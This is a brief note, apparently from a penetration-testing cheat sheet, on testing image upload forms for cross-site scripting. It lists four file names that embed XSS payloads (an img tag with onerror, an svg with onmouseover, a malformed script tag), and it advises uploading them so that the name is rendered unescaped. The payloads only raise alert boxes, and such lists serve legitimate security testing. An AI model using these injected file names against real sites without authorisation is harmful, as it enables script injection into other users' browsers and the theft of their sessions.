If you find a file upload function for an image then try to introducing an image with xss in the filename like so

<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('xss')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
